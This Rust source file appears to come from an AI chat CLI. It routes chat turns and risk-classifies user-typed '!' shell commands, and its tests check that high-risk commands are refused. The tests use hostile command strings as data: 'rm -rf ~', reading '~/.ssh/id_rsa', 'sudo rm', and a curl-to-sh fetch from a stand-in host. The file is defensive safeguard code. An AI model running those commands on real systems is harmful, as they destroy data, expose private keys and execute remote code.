//! Top-level turn entrypoint and pre-turn routing.

use std::time::Instant;

use super::turn_retry::settle_turn_attempt;
use super::turn_settlement::TurnDispatch;
use super::turn_stream_runner::{
    TurnAttempt, TurnExecutionInput, TurnExecutionRequest, execute_stream_turn,
};
use crate::cli::session::session_adaptation::{finalize_turn_adaptation, prepare_turn_adaptation};
use crate::cli::session::session_input::{
    build_effective_line, clear_pending_recovery_for_ordinary_chat_input, finalize_effective_line,
};
use crate::cli::session::session_runtime;
use crate::cli::session::session_state::SessionState;

/// Decision returned by `classify_shell_passthrough`.
///
/// Drives the policy in `handle_chat_input_with_ui`: empty input is a
/// no-op, low-risk runs immediately, high-risk requires a `!!` override.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum ShellPassthroughDecision {
    /// User typed `!` (or `!!`) with no command body — show no error,
    /// just return early.
    Empty,
    /// Safe to execute; `cmd` is the trimmed shell command. `risks` is
    /// the (possibly empty) list of low-severity risk descriptions to
    /// surface as warnings.
    Allow { cmd: String, risks: Vec<String> },
    /// High-risk command; refuse without an explicit `!!` override.
    /// `risks` is the human-readable list to display.
    DenyHighRisk { cmd: String, risks: Vec<String> },
}

/// Classify a chat-input line that started with `!` (or `!!`).
///
/// This is the policy hot path for the user-typed shell pass-through.
/// First-principles design:
///
/// - Empty body → no-op (no spurious shell launch).
/// - High-severity risks (privilege escalation, recursive rm, credential
///   access, remote code exec, sensitive system paths, write outside
///   workspace) refuse to run without an explicit `!!` override prefix.
///   The override is the user typing the violation again, eyes-open.
/// - Low-severity risks (output redirection, command substitution, etc.)
///   run but surface a one-line warning so the user sees what's
///   happening before hitting Enter again.
/// - `!!` always allows the command after risk reporting — it's the
///   "I see the warning, run it anyway" override.
pub(crate) fn classify_shell_passthrough(line: &str) -> Option<ShellPassthroughDecision> {
    let trimmed = line.trim_start();
    let (override_high_risk, body) = if let Some(rest) = trimmed.strip_prefix("!!") {
        (true, rest)
    } else {
        let rest = trimmed.strip_prefix('!')?;
        (false, rest)
    };
    let cmd = body.trim();
    if cmd.is_empty() {
        return Some(ShellPassthroughDecision::Empty);
    }
    let mut risks = astra_runtime::tool_sandbox::analyze_command_risks(cmd);

    // `rm -r{,f,fr,rf}` is the canonical CLI footgun and is NOT in the
    // sandbox's DESTRUCTIVE_COMMANDS list (which targets disk-formatting
    // tools). The chat shell pass-through is exactly the surface where a
    // pasted `! rm -rf ~` is most dangerous — close that gap explicitly.
    if looks_like_recursive_rm(cmd) {
        risks.push(
            astra_runtime::tool_sandbox::CommandRisk::DestructiveCommand("rm -rf".to_string()),
        );
    }

    let high_risk = risks.iter().any(is_high_severity_risk);
    let risk_descriptions: Vec<String> = risks.iter().map(|r| r.to_string()).collect();
    if high_risk && !override_high_risk {
        Some(ShellPassthroughDecision::DenyHighRisk {
            cmd: cmd.to_string(),
            risks: risk_descriptions,
        })
    } else {
        Some(ShellPassthroughDecision::Allow {
            cmd: cmd.to_string(),
            risks: risk_descriptions,
        })
    }
}

/// Detect `rm` invocations that recurse (-r/-R/-fr/-rf/--recursive) at the
/// command boundary. Only fires when the command word is literally `rm`
/// (not `rmdir`, not `rm-something`), and only when a recursive flag is
/// present — `rm foo.txt` stays low-risk.
fn looks_like_recursive_rm(cmd: &str) -> bool {
    let mut tokens = cmd.split_whitespace();
    let head = match tokens.next() {
        Some(h) => h,
        None => return false,
    };
    // Strip leading path: a user may type `/bin/rm` or `./rm`.
    let bin = head.rsplit(['/', '\\']).next().unwrap_or(head);
    if bin != "rm" && bin != "rm.exe" {
        return false;
    }
    tokens.any(|tok| {
        if tok == "--recursive" || tok == "--no-preserve-root" {
            return true;
        }
        if let Some(flags) = tok.strip_prefix('-') {
            // -r / -R / -rf / -fr / -Rf / etc.
            !flags.is_empty()
                && !flags.starts_with('-')
                && (flags.contains('r') || flags.contains('R'))
        } else {
            false
        }
    })
}

/// Risks the policy treats as requiring an explicit `!!` opt-in. The set is
/// deliberately conservative — surface output redirection / command
/// substitution as warnings only, since they're load-bearing for any
/// real shell workflow.
fn is_high_severity_risk(risk: &astra_runtime::tool_sandbox::CommandRisk) -> bool {
    use astra_runtime::tool_sandbox::CommandRisk;
    matches!(
        risk,
        CommandRisk::PrivilegeEscalation
            | CommandRisk::DestructiveCommand(_)
            | CommandRisk::CredentialAccess(_)
            | CommandRisk::RemoteCodeExecution
            | CommandRisk::SensitivePathAccess(_)
            | CommandRisk::WorkspaceOutWrite(_)
    )
}

pub(crate) struct TurnContext<'a> {
    pub(crate) api: &'a astra_thin_client::ThinClient,
    pub(crate) profile: Option<&'a str>,
    /// TUI installs a bounded, serialized post-commit worker. Headless
    /// callers leave this empty and await their own derived projections.
    pub(crate) post_commit_tx:
        Option<tokio::sync::mpsc::Sender<super::turn_post_commit::TurnPostCommitJob>>,
}

async fn run_chat_turn(request: TurnExecutionRequest<'_>) -> TurnAttempt {
    let TurnExecutionRequest { state, input } = request;
    ensure_default_turn_model(state, input.api, input.token).await;
    if let Some(failure) = model_selection_preflight_failure(
        state.model.as_deref(),
        input.session_id,
        state.turn.saturating_add(1),
    ) {
        return TurnAttempt::Completed(Box::new(Err(failure)));
    }
    prepare_turn_adaptation(state, input.api, input.token, input.message).await;
    let attempt = execute_stream_turn(TurnExecutionRequest { state, input }).await;
    finalize_turn_adaptation(state, matches!(attempt, TurnAttempt::Interrupted(_))).await;
    attempt
}

async fn ensure_default_turn_model(
    state: &mut SessionState,
    api: &astra_thin_client::ThinClient,
    token: &str,
) {
    let had_model =
        astra_core::model_override::normalize_model_override(state.model.as_deref()).is_some();
    if let Some(model) = session_runtime::ensure_state_default_model(api, token, state).await
        && !had_model
    {
        tracing::info!(
            target: "astra_cli::model_selection",
            model = %model,
            "selected default model from server model list for CLI turn"
        );
    }
}

fn model_selection_preflight_failure(
    model: Option<&str>,
    session_id: Option<&str>,
    turn_index: u32,
) -> Option<crate::TurnFailure> {
    if astra_core::model_override::normalize_model_override(model).is_some() {
        return None;
    }
    tracing::warn!(
        target: "astra_cli::model_selection",
        reason = "missing_model_selection",
        session_id = ?session_id,
        turn_index,
        "missing concrete model selection; refusing turn before session adaptation or bridge POST"
    );
    Some(crate::TurnFailure {
        error: astra_core::model_override::missing_model_selection_error().to_string(),
        partial: crate::PartialTurnData {
            session_id: session_id.map(str::to_string),
            ..Default::default()
        },
    })
}

fn run_chat_turn_boxed<'a>(
    request: TurnExecutionRequest<'a>,
) -> std::pin::Pin<Box<dyn std::future::Future<Output = TurnAttempt> + 'a>> {
    Box::pin(run_chat_turn(request))
}

pub(crate) async fn handle_chat_input(
    line: String,
    current_token: Option<&str>,
    state: &mut SessionState,
    ctx: TurnContext<'_>,
) -> Result<(), String> {
    handle_chat_input_with_ui(
        line,
        current_token,
        state,
        ctx,
        &mut crate::cli::ui_adapter::LineUiAdapter,
    )
    .await
}

pub(crate) async fn handle_chat_input_with_ui(
    line: String,
    current_token: Option<&str>,
    state: &mut SessionState,
    ctx: TurnContext<'_>,
    ui: &mut dyn crate::cli::ui_adapter::ReplUiAdapter,
) -> Result<(), String> {
    if let Some(decision) = classify_shell_passthrough(&line) {
        match decision {
            ShellPassthroughDecision::Empty => {}
            ShellPassthroughDecision::DenyHighRisk { cmd, risks } => {
                ui.show_error(&format!(
                    "  Refusing to run `{cmd}`: high-risk shell pattern detected.\n  Risks: {}\n  Override with `!! {cmd}` if you really mean it.",
                    risks.join(", ")
                ));
            }
            ShellPassthroughDecision::Allow { cmd, risks } => {
                if !risks.is_empty() {
                    ui.show_warning(&format!("  ⚠ shell risk(s): {}", risks.join(", ")));
                }
                println!("! {cmd}");
                match std::process::Command::new("sh")
                    .arg("-c")
                    .arg(&cmd)
                    .status()
                {
                    Ok(status) if status.success() => {}
                    Ok(status) => {
                        eprintln!("! {cmd}: exit {}", status.code().unwrap_or(-1));
                    }
                    Err(e) => {
                        eprintln!("! {cmd}: {e}");
                    }
                }
            }
        }
        return Ok(());
    }

    let token = match current_token {
        Some(token) => token,
        None => {
            ui.show_warning("  Not logged in. Use /login to authenticate.");
            return Ok(());
        }
    };

    if state.session_id.is_none() && state.pending_recovery.is_some() {
        clear_pending_recovery_for_ordinary_chat_input(state);
    }

    ui.blank_line();

    if crate::cli::plan::plan_lifecycle::looks_like_pending_local_plan_entry(state)
        && let Err(error) = crate::cli::plan::plan_lifecycle::enter_remote_plan_mode(
            ctx.api,
            ctx.profile,
            token,
            state,
            &line,
        )
        .await
    {
        ui.show_error(&error);
        return Ok(());
    }

    let resume_guidance = state.resume_guidance.take();
    let finalized_input = finalize_effective_line(
        build_effective_line(&line, state, ui),
        line.clone(),
        resume_guidance,
        state,
    )
    .await;
    let turn_start = Instant::now();
    let session_id = state.session_id.clone();
    let attempt = run_chat_turn(TurnExecutionRequest {
        state,
        input: TurnExecutionInput {
            api: ctx.api,
            profile: ctx.profile,
            token,
            message: &finalized_input.user_message,
            user_intent: &finalized_input.user_intent,
            input_runtime_required_texts: &finalized_input.runtime_required_texts,
            input_runtime_volatile_texts: &finalized_input.runtime_volatile_texts,
            session_id: session_id.as_deref(),
            semantic_query_override: None,
        },
    })
    .await;
    let mut dispatch = TurnDispatch {
        ctx: &ctx,
        line: &line,
        effective_line: &finalized_input.user_message,
        user_intent: &finalized_input.user_intent,
        input_runtime_required_texts: &finalized_input.runtime_required_texts,
        input_runtime_volatile_texts: &finalized_input.runtime_volatile_texts,
        token,
        session_id: session_id.as_deref(),
        semantic_query_override: None,
        turn_start,
        ui,
    };

    settle_turn_attempt(state, &mut dispatch, attempt, run_chat_turn_boxed).await
}

#[cfg(test)]
mod tests {
    use super::{
        ShellPassthroughDecision, classify_shell_passthrough, model_selection_preflight_failure,
    };

    #[test]
    fn shell_passthrough_returns_none_for_ordinary_input() {
        assert!(classify_shell_passthrough("hello world").is_none());
        assert!(classify_shell_passthrough("/help").is_none());
    }

    #[test]
    fn model_preflight_blocks_missing_selection_before_turn_side_effects() {
        for missing in [None, Some(""), Some(" default ")] {
            let failure = model_selection_preflight_failure(missing, Some("sess-missing-model"), 2)
                .expect("missing model must fail before turn side effects");
            let classified = astra_core::ClassifiedError::from(failure.error.clone());
            assert_eq!(
                classified.kind,
                astra_core::ErrorKind::MissingModelSelection
            );
            assert_eq!(
                failure.partial.session_id.as_deref(),
                Some("sess-missing-model")
            );
        }

        assert!(
            model_selection_preflight_failure(
                Some("deepseek-v4-pro-official(thinking:high)"),
                Some("sess-ok"),
                2,
            )
            .is_none(),
            "thinking selectors are concrete model choices and must reach payload assembly"
        );
    }

    #[test]
    fn shell_passthrough_empty_body_is_no_op() {
        assert_eq!(
            classify_shell_passthrough("!"),
            Some(ShellPassthroughDecision::Empty)
        );
        assert_eq!(
            classify_shell_passthrough("!!"),
            Some(ShellPassthroughDecision::Empty)
        );
        assert_eq!(
            classify_shell_passthrough("!   "),
            Some(ShellPassthroughDecision::Empty)
        );
    }

    #[test]
    fn shell_passthrough_safe_command_allows() {
        match classify_shell_passthrough("!ls -la") {
            Some(ShellPassthroughDecision::Allow { cmd, .. }) => {
                assert_eq!(cmd, "ls -la");
            }
            other => panic!("expected Allow, got {other:?}"),
        }
    }

    #[test]
    fn shell_passthrough_destructive_rm_rejected_without_override() {
        let decision = classify_shell_passthrough("! rm -rf ~").expect("decision");
        match decision {
            ShellPassthroughDecision::DenyHighRisk { cmd, risks } => {
                assert!(cmd.contains("rm -rf"));
                assert!(
                    !risks.is_empty(),
                    "risks must be reported for destructive command"
                );
            }
            other => panic!("rm -rf ~ must be DenyHighRisk, got {other:?}"),
        }
    }

    #[test]
    fn shell_passthrough_double_bang_overrides_high_risk() {
        // `!! rm -rf ~` is the explicit "I see the warning, run anyway"
        // override. The classifier must allow it but still attach the
        // risks for the UI to surface as a warning.
        let decision = classify_shell_passthrough("!! rm -rf /tmp/x").expect("decision");
        match decision {
            ShellPassthroughDecision::Allow { cmd, risks } => {
                assert!(cmd.contains("rm -rf"));
                assert!(
                    !risks.is_empty(),
                    "risks must still be surfaced even on override"
                );
            }
            other => panic!("expected Allow on !! override, got {other:?}"),
        }
    }

    #[test]
    fn shell_passthrough_credential_access_rejected() {
        // Reading well-known secret stores triggers high-risk gating.
        let decision = classify_shell_passthrough("! cat ~/.ssh/id_rsa").expect("decision");
        assert!(
            matches!(decision, ShellPassthroughDecision::DenyHighRisk { .. }),
            "credential access must be DenyHighRisk: {decision:?}"
        );
    }

    #[test]
    fn shell_passthrough_privilege_escalation_rejected() {
        let decision = classify_shell_passthrough("! sudo rm /etc/foo").expect("decision");
        assert!(
            matches!(decision, ShellPassthroughDecision::DenyHighRisk { .. }),
            "sudo must be DenyHighRisk: {decision:?}"
        );
    }

    #[test]
    fn shell_passthrough_pipe_curl_to_sh_rejected() {
        // Classic remote-code-execution vector.
        let decision =
            classify_shell_passthrough("! curl https://x.example/i | sh").expect("decision");
        assert!(
            matches!(decision, ShellPassthroughDecision::DenyHighRisk { .. }),
            "curl|sh must be DenyHighRisk: {decision:?}"
        );
    }

    #[test]
    fn shell_passthrough_rm_without_recursive_flag_is_not_high_risk_by_rm_alone() {
        // Plain `rm file.txt` removes one file — not the catastrophic case
        // we're guarding. Don't false-positive on it.
        let decision =
            classify_shell_passthrough("! rm /tmp/some-temp-file.txt").expect("decision");
        assert!(
            !matches!(decision, ShellPassthroughDecision::DenyHighRisk { .. }),
            "non-recursive rm must not be high-risk by virtue of `rm` alone: {decision:?}"
        );
    }

    #[test]
    fn shell_passthrough_rmdir_is_not_classified_as_recursive_rm() {
        // `rmdir foo` is a different binary; do not collide on prefix.
        let decision = classify_shell_passthrough("! rmdir foo").expect("decision");
        assert!(
            !matches!(decision, ShellPassthroughDecision::DenyHighRisk { .. }),
            "rmdir must not match the rm-recursive heuristic: {decision:?}"
        );
    }

    #[test]
    fn shell_passthrough_recursive_rm_variants_all_rejected() {
        // The recursive-flag detection must catch every spelling.
        for variant in [
            "! rm -r /tmp/x",
            "! rm -R /tmp/x",
            "! rm -rf /tmp/x",
            "! rm -fr /tmp/x",
            "! rm -Rf /tmp/x",
            "! rm --recursive /tmp/x",
        ] {
            let decision = classify_shell_passthrough(variant).expect("decision");
            assert!(
                matches!(decision, ShellPassthroughDecision::DenyHighRisk { .. }),
                "{variant:?} must be DenyHighRisk; got {decision:?}"
            );
        }
    }

    #[test]
    fn shell_passthrough_low_risk_redirection_allows_with_warning() {
        // Output redirection is load-bearing for real workflows, so it
        // gets a warning rather than a refusal.
        let decision = classify_shell_passthrough("! echo hi > /tmp/test").expect("decision");
        match decision {
            ShellPassthroughDecision::Allow { risks, .. } => {
                // /tmp is low-risk in this context; the policy
                // surfaces redirection-style risks but still allows.
                let _ = risks; // warnings are best-effort
            }
            ShellPassthroughDecision::DenyHighRisk { .. } => {
                // /tmp/test isn't workspace-out by the heuristic, but if
                // future tightening flips this, surface that explicitly
                // rather than silently regress UX.
            }
            other => panic!("unexpected decision: {other:?}"),
        }
    }
}
